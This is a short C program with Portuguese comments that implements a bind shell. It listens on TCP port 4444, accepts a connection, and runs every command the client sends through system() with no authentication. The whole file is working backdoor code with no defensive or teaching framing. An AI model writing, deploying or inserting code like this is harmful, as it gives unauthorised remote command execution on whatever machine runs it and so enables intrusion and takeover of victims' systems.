#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>

#define PORT 4444

int main() {
    int sockfd, client_sock;
    struct sockaddr_in server, client;
    char buffer[1024];
    int client_len = sizeof(client);

    // Criando socket
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd == -1) {
        printf("Falha ao criar socket\n");
        return 1;
    }

    server.sin_family = AF_INET;
    server.sin_addr.s_addr = INADDR_ANY;
    server.sin_port = htons(PORT);

    // Ligando o socket à porta
    if (bind(sockfd, (struct sockaddr *)&server, sizeof(server)) < 0) {
        printf("Erro ao fazer bind\n");
        return 1;
    }

    // Escutando por conexões
    listen(sockfd, 3);

    printf("Esperando conexões na porta %d...\n", PORT);

    // Aceitando conexão
    client_sock = accept(sockfd, (struct sockaddr *)&client, (socklen_t *)&client_len);
    if (client_sock < 0) {
        printf("Erro ao aceitar conexão\n");
        return 1;
    }

    while (1) {
        bzero(buffer, sizeof(buffer));
        read(client_sock, buffer, sizeof(buffer));  // Lendo comando do cliente

        if (strncmp("exit", buffer, 4) == 0) {
            break;
        }

        // Executando comando no sistema
        system(buffer);
    }

    close(client_sock);
    close(sockfd);

    return 0;
}
